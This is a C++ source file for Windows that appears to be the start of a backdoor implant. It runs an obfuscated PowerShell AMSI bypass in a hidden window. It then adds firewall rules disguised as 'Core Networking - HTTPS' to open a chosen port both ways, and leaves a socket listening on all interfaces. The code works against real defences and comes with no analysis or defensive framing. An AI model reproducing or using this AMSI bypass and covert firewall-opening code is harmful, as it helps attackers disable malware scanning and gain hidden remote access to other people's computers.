#include <iostream>
#include <winsock2.h> // Core Sockets
#include <windows.h>
#include <cstdint> // For AMSI Bypass

#define DEFAULT_CLIENT_IP "127.0.0.1"
#define DEFAULT_SERVER_IP "127.0.0.1"
#define DEFAULT_PORT 1024
#define BUFFER_SIZE 1024

struct SocketInfo {
    SOCKET windowsClientSocket;
    sockaddr_in serverAddress;
};

void bypass_AMSI() {
    HINSTANCE result = ShellExecute(
        NULL, 
        "open", 
        "powershell", 
        "-ExecutionPolicy Bypass -NoProfile -Command \"[ReF].\"`A$(echo sse)`mB$(echo L)`Y\".g`E$(echo tty)p`E\"(( \"Sy{3}ana{1}ut{4}ti{2}{0}ils\" -f'iUt','gement.A',\"on.Am`s\",\"stem.M\",\"oma\") ).\"$(echo ge)`Tf`i$(echo El)D\"((\"{0}{2}ni{1}iled\" -f'am','tFa',\"`siI\"),(\"{2}ubl{0}`,{1}{0}\" -f 'ic','Stat','NonP')).\"$(echo Se)t`Va$(echo LUE)\"($(),$(1 -eq 1))\"",
        NULL, 
        SW_HIDE);  // SW_HIDE to hide the PowerShell window

    if (reinterpret_cast<uintptr_t>(result) <= 32) {
        // ShellExecute failed
        std::cerr << "AMSI Bypass has Failed with Error: " << reinterpret_cast<uintptr_t>(result) << std::endl;
    } else {
        // ShellExecute succeeded
        std::cout << "AMSI Bypass Successful!" << std::endl;
    }
}

SocketInfo createSocketWindows() {
    WSADATA winSockData; // Initializes Winsock
    if (WSAStartup(MAKEWORD(2, 2), &winSockData) != 0) {
        std::cerr << "WSAStartup failed!" << std::endl;
        exit(1);
    }

    SOCKET windowsServerSocket = socket(AF_INET, SOCK_STREAM, 0); // Creates Socket
    if (windowsServerSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        WSACleanup(); // Terminates Winsock
        exit(1);
    }

    sockaddr_in serverAddress; // Stores Address of Socket
    serverAddress.sin_family = AF_INET; // IPv4

    std::cout << "Socket created!" << std::endl;
    return {windowsServerSocket, serverAddress};
}

void connectSocketWindows(SOCKET serverSocket, sockaddr_in serverAddress) {
    if (bind(serverSocket, (sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) { // Binds Socket to Address
        std::cerr << "Socket binding failed: " << WSAGetLastError() << std::endl;
        closesocket(serverSocket); // Closes Socket
        WSACleanup(); // Terminates Winsock
        exit(1);
    }

    std::cout << "Windows socket bound successfully!" << std::endl;

    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) { // Listens for Connections
        std::cerr << "Socket listening failed: " << WSAGetLastError() << std::endl;
        closesocket(serverSocket); // Closes Socket
        WSACleanup(); // Terminates Winsock
        exit(1);
    }

    std::cout << "Windows socket is now listening!" << std::endl;

    SOCKET clientSocket = accept(serverSocket, NULL, NULL); // Accepts Connection
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Socket accepting failed: " << WSAGetLastError() << std::endl;
        closesocket(serverSocket); // Closes Socket
        WSACleanup(); // Terminates Winsock
        exit(1);
    }

    std::cout << "Windows socket accepted connection!" << std::endl;
}

void open_firewall_port(int port) {
    std::string port_str = std::to_string(port);
    std::string firewall_in = "powershell -Command \"& {netsh advfirewall firewall add rule name='Core Networking - HTTPS (TCP-In)' dir=in action=allow protocol=TCP localport=" + port_str + "} | Out-Null\"";
    std::string firewall_out = "powershell -Command \"& {netsh advfirewall firewall add rule name='Core Networking - HTTPS (TCP-Out)' dir=out action=allow protocol=TCP localport=" + port_str + "} | Out-Null\"";
    system(firewall_in.c_str());
    system(firewall_out.c_str());
    std::cout << "Firewall Rules Created!" << std::endl;
}

int main(int argc, char* argv[]) {
    std::string clientIP = DEFAULT_CLIENT_IP;
    int port = DEFAULT_PORT;

    // Parse command-line arguments
    if (argc > 1) { port = atoi(argv[1]); } // Set Port

    std::cout << "Client IP: " << clientIP << std::endl;
    std::cout << "Port: " << port << std::endl;

    // Bypass AMSI
    bypass_AMSI();

    // Opens firewall port
    open_firewall_port(port);

    SocketInfo socketInfo;
    std::cout << "Running on Windows" << std::endl;
    socketInfo = createSocketWindows();
    socketInfo.serverAddress.sin_port = htons(static_cast<u_short>(port)); // Set Port
    socketInfo.serverAddress.sin_addr.s_addr = INADDR_ANY; // Accepts connections from any interface
    connectSocketWindows(static_cast<SOCKET>(socketInfo.windowsClientSocket), socketInfo.serverAddress);
    return 0;
}
